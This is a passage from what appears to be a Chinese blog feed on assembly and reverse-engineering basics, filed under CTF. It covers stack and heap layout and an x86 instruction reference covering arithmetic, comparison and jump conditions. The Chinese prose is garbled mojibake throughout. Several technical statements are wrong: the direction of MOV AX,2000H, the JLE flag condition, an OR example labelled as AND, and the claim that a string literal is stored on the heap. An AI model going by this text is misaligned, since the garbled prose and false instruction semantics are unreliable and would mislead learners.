ˆçš„ï¼Œç„¶åæ˜¯å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ã€‚==é™æ€å˜é‡ä¸å…¥æ ˆã€‚==</li></ul><p>==è°ƒç”¨ç»“æŸåï¼Œå±€éƒ¨å˜é‡å…ˆå‡ºæ ˆï¼Œç„¶åæ˜¯å‚æ•°ï¼Œæœ€åæ ˆé¡¶æŒ‡å‘æœ€å¼€å§‹å­˜çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¸»å‡½æ•°ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œç¨‹åºç”±è¯¥ç‚¹ç»§ç»­è¿è¡Œ==</p><ul><li>å †:ä¸€èˆ¬æ˜¯åœ¨å †çš„å¤´éƒ¨ç”¨ä¸€ä¸ªå­—èŠ‚å­˜æ”¾å †çš„å¤§å°ã€‚å †ä¸­å…·ä½“å†…å®¹ç”±ç¨‹åºå‘˜å®‰æ’ã€‚</li></ul><h3 id="6ã€å­˜å–æ•ˆç‡çš„æ¯”è¾ƒ"><a href="#6ã€å­˜å–æ•ˆç‡çš„æ¯”è¾ƒ" class="headerlink" title="6ã€å­˜å–æ•ˆç‡çš„æ¯”è¾ƒ"></a>6ã€å­˜å–æ•ˆç‡çš„æ¯”è¾ƒ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> s1[] = <span class="hljs-string">&quot;aaaaaaaaaaaaaaa&quot;</span>; <br><span class="hljs-keyword">char</span> *s2 = <span class="hljs-string">&quot;bbbbbbbbbbbbbbbbb&quot;</span>; <br></code></pre></td></tr></table></figure><p>aaaaaaaaaaaæ˜¯åœ¨è¿è¡Œæ—¶åˆ»èµ‹å€¼çš„ï¼›ï¼ˆå­—ç¬¦æ•°ç»„æœ‰è¿ç»­ç©ºé—´å­˜æ”¾å€¼ï¼‰æ”¾åœ¨æ ˆä¸­ã€‚<br>è€Œbbbbbbbbbbbæ˜¯åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šçš„ï¼›ï¼ˆåªæœ‰4å­—èŠ‚çš„ç©ºé—´ç”¨äºå­˜æ”¾åœ°å€ï¼‰æ”¾åœ¨å †ä¸­ã€‚<br>==åœ¨ä»¥åçš„å­˜å–ä¸­ï¼Œåœ¨æ ˆä¸Šçš„æ•°ç»„æ¯”æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²(ä¾‹å¦‚å †)å¿«==</p><h2 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h2><p>==æ‰€æœ‰å€¼é€šå¸¸ä»¥16è¿›åˆ¶å½¢å¼å‚¨å­˜çš„ã€‚==</p><p>å¤§éƒ¨åˆ†æŒ‡ä»¤æœ‰ä¸¤ä¸ªæ“ä½œç¬¦ï¼ˆä¾‹å¦‚add EAX,EBXï¼‰,æœ‰äº›æ˜¯ä¸€ä¸ªï¼ˆä¾‹å¦‚not EAXï¼‰ï¼Œè¿˜æœ‰ä¸€äº›æ˜¯ä¸‰ä¸ªæ“ä½œç¬¦ï¼ˆä¾‹å¦‚IMUL EAXï¼ŒEDXï¼Œ64ï¼‰ã€‚å¦‚æœä½¿ç”¨â€œDWORD PTR [XXX]â€å°±è¡¨ç¤ºä½¿ç”¨äº†å†…å­˜ä¸­åç§»é‡ä¸ºXXXçš„æ•°æ®ã€‚<strong>Win+Intelçš„ç”µè„‘å¤§å¤šé‡‡ç”¨â€œä½å°¾ç«¯æ³•â€ï¼Œæ‰€ä»¥å­—èŠ‚åœ¨å†…å­˜ä¸­å‚¨å­˜æ–¹å¼æ˜¯å€’è¿‡æ¥çš„ã€‚</strong></p><blockquote><p>å¤§éƒ¨åˆ†æœ‰ä¸¤ä¸ªæ“ä½œç¬¦çš„æŒ‡ä»¤éƒ½æ˜¯ä»¥ä¸‹è¿™ç§æ ¼å¼ï¼ˆä»¥addä¸¾ä¾‹ï¼‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">ebx</span>                           å¯„å­˜å™¨, å¯„å­˜å™¨<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">123</span>                           å¯„å­˜å™¨, æ•°å€¼<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">404000</span>]            å¯„å­˜å™¨, <span class="hljs-built_in">Dword</span>  æŒ‡é’ˆ [æ•°å€¼]<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>]               å¯„å­˜å™¨, <span class="hljs-built_in">Dword</span>  æŒ‡é’ˆ [å¯„å­˜å™¨å€¼]<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-number">00404000</span>]      å¯„å­˜å™¨, <span class="hljs-built_in">Dword</span>  æŒ‡é’ˆ [å¯„å­˜å™¨å€¼+æ•°å€¼]<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">404000</span>],<span class="hljs-built_in">eax</span>            <span class="hljs-built_in">Dword</span> æŒ‡é’ˆ[æ•°å€¼], å¯„å­˜å™¨<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">404000</span>],<span class="hljs-number">123</span>            <span class="hljs-built_in">Dword</span> æŒ‡é’ˆ[æ•°å€¼], æ•°å€¼<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">eax</span>               <span class="hljs-built_in">Dword</span> æŒ‡é’ˆ[å¯„å­˜å™¨å€¼], å¯„å­˜å™¨<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-number">123</span>               <span class="hljs-built_in">Dword</span> æŒ‡é’ˆ[å¯„å­˜å™¨å€¼], æ•°å€¼<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-number">404000</span>],<span class="hljs-built_in">eax</span>        <span class="hljs-built_in">Dword</span> æŒ‡é’ˆ[å¯„å­˜å™¨å€¼+æ•°å€¼], å¯„å­˜å™¨<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-number">404000</span>],<span class="hljs-number">123</span>        <span class="hljs-built_in">Dword</span> æŒ‡é’ˆ[å¯„å­˜å™¨å€¼+æ•°å€¼], æ•°å€¼<br></code></pre></td></tr></table></figure></blockquote><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD è¢«åŠ æ•°ï¼ŒåŠ æ•°</p><p>å°†ä¸€ä¸ªæ•°å€¼åŠ åœ¨ä¸€ä¸ªå¯„å­˜å™¨ä¸Šæˆ–è€…ä¸€ä¸ªå†…å­˜åœ°å€ä¸Šã€‚</p><p>add eax,123 == eax = eax +123</p><p>åŠ æ³•æŒ‡ä»¤å¯¹ZFï¼ŒOFï¼ŒCFéƒ½æœ‰å½±å“</p><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND ç›®æ ‡æ•°ï¼ŒåŸæ•°</p><p>ANDè¿ç®—å¯¹ä¸¤ä¸ªæ•°è¿›è¡Œé€»è¾‘ä¸è¿ç®—ã€‚</p><p>ä¼šæ¸…ç©ºOF,CFæ ‡è®°ï¼Œè®¾ç½®ZFæ ‡è®°ã€‚</p><h3 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h3><blockquote><p>CALL 404000                 æœ€å¸¸è§: CALL åœ°å€<br>CALL EAX                    CALL å¯„å­˜å™¨ - å¦‚æœå¯„å­˜å™¨å­˜çš„å€¼ä¸º404000ï¼Œé‚£å°±ç­‰åŒäºç¬¬ä¸€ç§æƒ…å†µ<br>CALL DWORD PTR [EAX]        CALL [EAX]åç§»é‡æ‰€æŒ‡å‘çš„åœ°å€<br>CALL DWORD PTR [EAX+5]      CALL [EAX+5]åç§»é‡æ‰€æŒ‡å‘çš„åœ°å€</p></blockquote><h3 id="CDQ"><a href="#CDQ" class="headerlink" title="==CDQ=="></a>==CDQ==</h3><p>é€šå¸¸å‡ºç°åœ¨é™¤æ³•å‰é¢ï¼Œå°†EDXçš„æ‰€æœ‰ä½å˜æˆEAXæœ€é«˜ä½çš„å€¼</p><p>æ¯”å¦‚å½“EAX&gt;=80000000hæ—¶ï¼Œå…¶äºŒè¿›åˆ¶æœ€é«˜ä½ä¸º1ï¼Œåˆ™EDXè¢«32ä½å…¨èµ‹å€¼ä¸º1ï¼Œå³FFFFFFFF</p><p>è‹¥EAX&lt;80000000ï¼Œåˆ™å…¶äºŒè¿›åˆ¶æœ€é«˜ä½ä¸º0ï¼ŒEDXä¸º00000000ã€‚</p><p>ç„¶åå°†EDXï¼šEAXç»„æˆæ–°æ•°(64ä½)ï¼šFFFFFFFF 80000000</p><h3 id="CMPï¼ˆcompareï¼‰"><a href="#CMPï¼ˆcompareï¼‰" class="headerlink" title="CMPï¼ˆcompareï¼‰"></a>CMPï¼ˆcompareï¼‰</h3><p>CMP ç›®æ ‡æ•°ï¼ŒåŸæ•°</p><p>æ¯”è¾ƒä¸¤ä¸ªå€¼å¹¶ä¸”æ ‡è®°CFã€OFã€ZF:</p><blockquote><p>CMP     EAX, EBX               æ¯”è¾ƒeaxå’Œebxæ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰å°±è®¾ç½®ZFä¸º1<br>CMP     EAX,[404000]           æ¯”è¾ƒeaxå’Œåç§»é‡ä¸º[404000]çš„å€¼æ˜¯å¦ç›¸ç­‰<br>CMP     [404000],EAX           æ¯”è¾ƒ[404000]æ˜¯å¦ä¸eaxç›¸ç­‰</p></blockquote><h3 id="DEC-decrease"><a href="#DEC-decrease" class="headerlink" title="DEC(decrease)"></a>DEC(decrease)</h3><p>DEC something</p><p>è‡ªå‡</p><blockquote><p>dec eax                              eaxè‡ªå‡1<br>dec [eax]                            åç§»é‡ä¸ºeaxçš„å€¼è‡ªå‡1<br>dec [401000]                         åç§»é‡ä¸º401000çš„å€¼è‡ªå‡1<br>dec [eax+401000]                     åç§»é‡ä¸ºeax+401000çš„å€¼è‡ªå‡1</p></blockquote><p>å¯ä»¥æ ‡è®°ZFã€OF</p><h3 id="DIVï¼ˆdivisioné™¤ï¼‰"><a href="#DIVï¼ˆdivisioné™¤ï¼‰" class="headerlink" title="DIVï¼ˆdivisioné™¤ï¼‰"></a>DIVï¼ˆdivisioné™¤ï¼‰</h3><p>DIV é™¤æ•°</p><p>æ— ç¬¦å·é™¤æ³•</p><p>DIVæŒ‡ä»¤ç”¨æ¥å°†EAXé™¤ä»¥é™¤æ•°ï¼ˆæ— ç¬¦å·é™¤æ³•ï¼‰ï¼Œè¢«é™¤æ•°é€šå¸¸æ˜¯EAXï¼Œç»“æœä¹Ÿå‚¨å­˜åœ¨EAXä¸­ï¼Œè€Œè¢«é™¤æ•°å¯¹é™¤æ•°å–çš„æ¨¡å­˜åœ¨é™¤æ•°ä¸­ã€‚</p><blockquote><p>mov eax,64                       EAX = 64h = 100<br>mov ecx,9                        ECX = 9<br>div ecx                          EAXé™¤ä»¥ECX</p></blockquote><p>EAX = 100/9 = 0B(11)å¹¶ä¸”ECX = 100 MOD 9 = 1</p><p>å¯ä»¥æ ‡è®°CFã€OFã€ZF</p><h3 id="IDIVï¼ˆæ•´é™¤ï¼‰"><a href="#IDIVï¼ˆæ•´é™¤ï¼‰" class="headerlink" title="IDIVï¼ˆæ•´é™¤ï¼‰"></a>IDIVï¼ˆæ•´é™¤ï¼‰</h3><p>IDIV é™¤æ•°</p><p>æœ‰ç¬¦å·é™¤æ³•</p><p>æ‰§è¡Œæ–¹æ³•åŒdivä¸€æ ·</p><h3 id="INCï¼ˆincreaseï¼‰"><a href="#INCï¼ˆincreaseï¼‰" class="headerlink" title="INCï¼ˆincreaseï¼‰"></a>INCï¼ˆincreaseï¼‰</h3><p>è‡ªåŠ </p><p>å¯ä»¥æ ‡è®°ZFã€OF</p><p><strong>INT</strong></p><p>è¯­æ³•: int ç›®æ ‡æ•°</p><p>INT çš„ç›®æ ‡æ•°å¿…é¡»æ˜¯äº§ç”Ÿä¸€ä¸ªæ•´æ•°(ä¾‹å¦‚ï¼šint 21h)ï¼Œç±»ä¼¼äºcallè°ƒç”¨å‡½æ•°ï¼ŒINTæŒ‡ä»¤æ˜¯è°ƒç”¨ç¨‹åºå¯¹ç¡¬ä»¶æ§åˆ¶ï¼Œä¸åŒçš„å€¼å¯¹åº”ç€ä¸åŒçš„åŠŸèƒ½ã€‚</p><p>å…·ä½“å‚ç…§ç¡¬ä»¶è¯´æ˜ä¹¦ã€‚</p><p><strong>JUMPS</strong></p><p>è¿™äº›éƒ½æ˜¯æœ€é‡è¦çš„è·³è½¬æŒ‡ä»¤å’Œè§¦å‘æ¡ä»¶(é‡è¦ç”¨<em>æ ‡è®°ï¼Œæœ€é‡è¦ç”¨*</em>æ ‡è®°)ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æŒ‡ä»¤                æ¡ä»¶                    æ¡ä»¶<br>JA*          -    å¦‚æœå¤§äºå°±è·³è½¬(æ— ç¬¦å·)      - <span class="hljs-attribute">CF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">ZF</span>=0<br>JAE          -    å¦‚æœå¤§äºæˆ–ç­‰äºå°±è·³è½¬(æ— ç¬¦å·)- <span class="hljs-attribute">CF</span>=0<br>JB*          -    å¦‚æœå°äºå°±è·³è½¬(æ— ç¬¦å·)   - <span class="hljs-attribute">CF</span>=1<br>JBE          -    å¦‚æœå°äºæˆ–ç­‰äºå°±è·³è½¬(æ— ç¬¦å·)- <span class="hljs-attribute">CF</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">ZF</span>=1<br>JC           -    å¦‚æœCFè¢«æ ‡è®°å°±äº†è·³è½¬       - <span class="hljs-attribute">CF</span>=1<br>JCXZ         -    å¦‚æœCXç­‰äº0å°±è·³è½¬      - <span class="hljs-attribute">CX</span>=0<br>JE**         -    å¦‚æœç›¸ç­‰å°±è·³è½¬        - <span class="hljs-attribute">ZF</span>=1<br>JECXZ        -    å¦‚æœECXç­‰äº0å°±è·³è½¬       - <span class="hljs-attribute">ECX</span>=0<br>JG*          -    å¦‚æœå¤§äºå°±è·³è½¬(æœ‰ç¬¦å·)   - <span class="hljs-attribute">ZF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">SF</span>=OF (SF = Sign Flag)<br>JGE*         -    å¦‚æœå¤§äºæˆ–ç­‰äºå°±è·³è½¬(æœ‰ç¬¦å·) - <span class="hljs-attribute">SF</span>=OF<br>JL*          -    å¦‚æœå°äºå°±è·³è½¬(æœ‰ç¬¦å·)    - SF != OF (!= is <span class="hljs-keyword">not</span>)<br>JLE*         -    å¦‚æœå°äºæˆ–ç­‰äºå°±è·³è½¬(æœ‰ç¬¦å· - <span class="hljs-attribute">ZF</span>=1 <span class="hljs-keyword">and</span> OF != OF<br>JMP**        -    è·³è½¬             - å¼ºåˆ¶è·³è½¬<br>JNA          -    å¦‚æœä¸å¤§äºå°±è·³è½¬(æ— ç¬¦å·)   - <span class="hljs-attribute">CF</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">ZF</span>=1<br>JNAE         -    å¦‚æœä¸å¤§äºç­‰äºå°±è·³è½¬(æ— ç¬¦å·) - <span class="hljs-attribute">CF</span>=1<br>JNB          -    å¦‚æœä¸å°äºå°±è·³è½¬(æ— ç¬¦å·)   - <span class="hljs-attribute">CF</span>=0<br>JNBE         -    å¦‚æœä¸å°äºç­‰äºå°±è·³è½¬(æ— ç¬¦å·) - <span class="hljs-attribute">CF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">ZF</span>=0<br>JNC          -    å¦‚æœCFæœªè¢«æ ‡è®°å°±è·³è½¬     - <span class="hljs-attribute">CF</span>=0<br>JNE**        -    å¦‚æœä¸ç­‰äºå°±è·³è½¬       - <span class="hljs-attribute">ZF</span>=0<br>JNG          -    å¦‚æœä¸å¤§äºå°±è·³è½¬(æœ‰ç¬¦å·)   - <span class="hljs-attribute">ZF</span>=1 <span class="hljs-keyword">or</span> SF!=OF<br>JNGE         -    å¦‚æœä¸å¤§äºç­‰äºå°±è·³è½¬(æœ‰ç¬¦å·) - SF!=OF<br>JNL          -    å¦‚æœä¸å°äºå°±è·³è½¬(æœ‰ç¬¦å·)   - <span class="hljs-attribute">SF</span>=OF<br>JNLE         -    å¦‚æœä¸å°äºç­‰äºå°±è·³è½¬(æœ‰ç¬¦å·) - <span class="hljs-attribute">ZF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">SF</span>=OF<br>JNO          -    å¦‚æœOFæœªè¢«æ ‡è®°å°±è·³è½¬     - <span class="hljs-attribute">OF</span>=0<br>JNP          -    å¦‚æœPFæœªè¢«æ ‡è®°å°±è·³è½¬     - <span class="hljs-attribute">PF</span>=0<br>JNS          -    å¦‚æœSFæœªè¢«æ ‡è®°å°±è·³è½¬      - <span class="hljs-attribute">SF</span>=0<br>JNZ          -    å¦‚æœä¸ç­‰äº0å°±è·³è½¬      - <span class="hljs-attribute">ZF</span>=0<br>JO           -    å¦‚æœOFè¢«æ ‡è®°å°±è·³è½¬     - <span class="hljs-attribute">OF</span>=1<br>JP           -    å¦‚æœPFè¢«æ ‡è®°å°±è·³è½¬     - <span class="hljs-attribute">PF</span>=1<br>JPE          -    å¦‚æœæ˜¯å¶æ•°å°±è·³è½¬       - <span class="hljs-attribute">PF</span>=1<br>JPO          -    å¦‚æœæ˜¯å¥‡æ•°å°±è·³è½¬       - <span class="hljs-attribute">PF</span>=0<br>JS           -    å¦‚æœSFè¢«æ ‡è®°å°±è·³è½¬     - <span class="hljs-attribute">SF</span>=1<br>JZ           -    å¦‚æœç­‰äº0å°±è·³è½¬      - <span class="hljs-attribute">ZF</span>=1<br></code></pre></td></tr></table></figure><p><strong>LEA (æœ‰æ•ˆåœ°å€ä¼ é€)</strong></p><p>è¯­æ³•ï¼šLEA ç›®çš„æ•°ã€æºæ•°</p><p>LEAå¯ä»¥çœ‹æˆå’ŒMOVå·®ä¸å¤šçš„æŒ‡ä»¤LEA ï¼Œå®ƒæœ¬èº«çš„åŠŸèƒ½å¹¶æ²¡æœ‰è¢«å¤ªå¹¿æ³›çš„ä½¿ç”¨ï¼Œåè€Œå¹¿æ³›è¿ç”¨åœ¨å¿«é€Ÿä¹˜æ³•ä¸­ï¼š</p><p>lea eaxï¼Œdword ptr [4*ecx+ebx]</p><p>å°†eaxèµ‹å€¼ä¸º 4*ecx+ebx</p><p><strong>MOV (ä¼ é€)</strong></p><p>è¯­æ³•: MOV ç›®çš„æ•°,æºæ•°</p><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„æŒ‡ä»¤ï¼ŒMOVæŒ‡ä»¤å°†æºæ•°èµ‹å€¼ç»™ç›®çš„æ•°ï¼Œå¹¶ä¸”æºæ•°å€¼ä¿æŒä¸å˜</p><p>è¿™é‡Œæœ‰ä¸€äº›MOVçš„å˜å½¢ï¼š</p><p>MOVS/MOVSB/MOVSW/MOVSD EDI, ESIï¼šè¿™äº›å˜å½¢èƒ½å°†ESIæŒ‡å‘çš„å†…å®¹ä¼ é€åˆ°EDIæŒ‡å‘çš„å†…å®¹ä¸­å»</p><p>MOVSXï¼šMOVSXæŒ‡ä»¤å°†å•å­—æˆ–è€…å•å­—èŠ‚æ‰©å±•ä¸ºåŒå­—æˆ–è€…åŒå­—èŠ‚ä¼ é€ï¼ŒåŸç¬¦å·ä¸å˜</p><p>MOVZXï¼šMOVZXæ‰©å±•å•å­—èŠ‚æˆ–å•å­—ä¸ºåŒå­—èŠ‚æˆ–åŒå­—å¹¶ä¸”ç”¨0å¡«å……å‰©ä½™éƒ¨åˆ†(é€šä¿—æ¥è¯´å°±æ˜¯å°†æºæ•°å–å‡ºç½®äºç›®çš„æ•°ï¼Œå…¶ä»–ä½ç”¨0å¡«å……)</p><p><strong>MUL (multiplyä¹˜æ³•)</strong></p><p>è¯­æ³•ï¼šMUL æ•°å€¼</p><p>è¿™ä¸ªæŒ‡ä»¤åŒIMULä¸€æ ·ï¼Œä¸è¿‡MULå¯ä»¥ä¹˜æ— ç¬¦å·æ•°ã€‚</p><p><strong>NOP (æ— æ“ä½œ)</strong></p><p>è¯­æ³•ï¼šNOP</p><p>è¿™ä¸ªæŒ‡ä»¤è¯´æ˜ä¸åšä»»ä½•äº‹</p><p>æ‰€ä»¥å®ƒåœ¨é€†å‘ä¸­è¿ç”¨èŒƒå›´æœ€å¹¿</p><p><strong>OR (é€»è¾‘æˆ–)</strong></p><p>è¯­æ³•ï¼šOR ç›®çš„æ•°,æºæ•°</p><p>ORæŒ‡ä»¤å¯¹ä¸¤ä¸ªå€¼è¿›è¡Œé€»è¾‘æˆ–è¿ç®—</p><p>è¿™ä¸ªæŒ‡ä»¤ä¼šæ¸…ç©ºOFã€CFæ ‡è®°ï¼Œè®¾ç½®ZFæ ‡è®°</p><p>ä¸ºäº†æ›´å¥½çš„ç†è§£ORï¼Œæ€è€ƒä¸‹é¢äºŒè¿›åˆ¶ä¸²:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">10010101100101001101<br></code></pre></td></tr></table></figure><p>å¦‚æœå¯¹å®ƒä»¬è¿›è¡Œé€»è¾‘ä¸è¿ç®—ï¼Œç»“æœå°†æ˜¯1101011111ã€‚</p><p>åªæœ‰å½“ä¸¤è¾¹åŒä¸º0æ—¶å…¶ç»“æœä¸º0ï¼Œå¦åˆ™å°±ä¸º1ã€‚ä½ å¯ä»¥ç”¨è®¡ç®—å™¨å°è¯•è®¡ç®—ã€‚å¸Œæœ›ä½ èƒ½ç†è§£ä¸ºä»€ä¹ˆï¼Œæœ€å¥½è‡ªå·±åŠ¨æ‰‹ç®—ä¸€ç®—</p><p><strong>POP</strong></p><p>è¯­æ³•ï¼šPOP ç›®çš„åœ°å€</p><p>POPæŒ‡ä»¤å°†æ ˆé¡¶ç¬¬ä¸€ä¸ªå­—ä¼ é€åˆ°ç›®çš„åœ°å€ã€‚ æ¯æ¬¡POPåï¼ŒESP(æ ˆæŒ‡é’ˆå¯„å­˜å™¨)éƒ½ä¼šå¢åŠ ä»¥æŒ‡å‘æ–°æ ˆé¡¶</p><p><strong>PUSH</strong></p><p>è¯­æ³•ï¼šPUSH å€¼</p><p>PUSHæ˜¯POPçš„ç›¸åæ“ä½œï¼Œå®ƒå°†ä¸€ä¸ªå€¼å‹å…¥æ ˆå¹¶ä¸”å‡å°æ ˆé¡¶æŒ‡é’ˆå€¼ä»¥æŒ‡å‘æ–°æ ˆé¡¶ã€‚</p><p><strong>REP/REPE/REPZ/REPNE/REPNZ</strong></p><p>è¯­æ³•: REP/REPE/REPZ/REPNE/REPNZ ins</p><p>é‡å¤ä¸Šé¢çš„æŒ‡ä»¤ï¼šç›´åˆ°CX=0ã€‚inså¿…é¡»æ˜¯ä¸€ä¸ªæ“ä½œç¬¦ï¼Œæ¯”å¦‚CMPSã€INSã€LODSã€MOVSã€OUTSã€SCAS æˆ– STOS</p><p><strong>RET (returnè¿”å›)</strong></p><p>è¯­æ³•ï¼šRET</p><p>RET digit</p><p>RETæŒ‡ä»¤çš„åŠŸèƒ½æ˜¯ä»ä¸€ä¸ªä»£ç åŒºåŸŸä¸­é€€å‡ºåˆ°è°ƒç”¨CALLçš„æŒ‡ä»¤å¤„ã€‚</p><p>RET digitåœ¨è¿”å›å‰ä¼šæ¸…ç†æ ˆ</p><p><strong>SUB (å‡)</strong></p><p>è¯­æ³•ï¼šSUB ç›®çš„æ•°,æºæ•°</p><p>SUBä¸ADDç›¸åï¼Œå®ƒå°†æºæ•°å‡å»ç›®çš„æ•°ï¼Œå¹¶å°†ç»“æœå‚¨å­˜åœ¨ç›®çš„æ•°ä¸­</p><p>SUBå¯ä»¥æ ‡è®°ZFã€OFã€CF</p><p><strong>TEST</strong></p><p>è¯­æ³•ï¼šTEST æ“ä½œç¬¦ã€æ“ä½œç¬¦</p><p>è¿™ä¸ªæŒ‡ä»¤99%éƒ½æ˜¯ç”¨äºâ€TEST EAX, EAXâ€ï¼Œå®ƒæ‰§è¡Œä¸ANDç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯å¹¶ä¸å‚¨å­˜æ•°æ®ã€‚å¦‚æœEAX=0å°±ä¼šæ ‡è®°ZFï¼Œå¦‚æœEAXä¸æ˜¯0ï¼Œå°±ä¼šæ¸…ç©ºZF</p><p><strong>XOR</strong></p><p>è¯­æ³•ï¼šXOR ç›®çš„æ•°,æºæ•°</p><p>XORæŒ‡ä»¤å¯¹ä¸¤ä¸ªæ•°è¿›è¡Œå¼‚æˆ–æ“ä½œ</p><p>è¿™ä¸ªæŒ‡ä»¤æ¸…ç©ºOFã€CFï¼Œä½†ä¼šæ ‡è®°ZF</p><p>ä¸ºäº†æ›´å¥½çš„ç†è§£ï¼Œæ€è€ƒä¸‹é¢çš„äºŒè¿›åˆ¶ä¸²ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1001010110</span><br><span class="hljs-number">0101001101</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå¼‚æˆ–å®ƒä»¬ï¼Œç»“æœå°†æ˜¯1100011011</p><p>å¦‚æœä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œåˆ™ç»“æœä¸º0ï¼Œå¦åˆ™ä¸º1ã€‚</p><p>å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬ä¼šä½¿ç”¨â€XOR EAX, EAXâ€ï¼Œè¿™ä¸ªæ“ä½œæ˜¯å°†EAXèµ‹å€¼ä¸º0ï¼Œå› ä¸ºå½“ä¸€ä¸ªå€¼å¼‚æˆ–å…¶è‡ªèº«ï¼Œå°±è¿‡éƒ½æ˜¯0ã€‚ä½ æœ€å¥½è‡ªå·±åŠ¨æ‰‹å°è¯•ä¸‹ï¼Œè¿™æ ·å¯ä»¥å¸®åŠ©ä½ ç†è§£å¾—æ›´å¥½</p><h3 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h3><p>MOV AX , 2000H å°†AXä¼ ç»™2000H</p><h3 id="é€»è¾‘æ“ä½œç¬¦"><a href="#é€»è¾‘æ“ä½œç¬¦" class="headerlink" title="é€»è¾‘æ“ä½œç¬¦"></a>é€»è¾‘æ“ä½œç¬¦</h3><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/Snipaste_2019-08-12_22-36-43.jpg" class="" title="Snipaste_2019-08-12_22-36-43"><h2 id="MIPSæ±‡ç¼–"><a href="#MIPSæ±‡ç¼–" class="headerlink" title="MIPSæ±‡ç¼–"></a>MIPSæ±‡ç¼–</h2><p><a href="https://www.cnblogs.com/thoupin/p/4018455.html">link</a></p><p>xori å¼‚æˆ–</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå¤ä¹ </title>
    <link href="/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/</url>
    
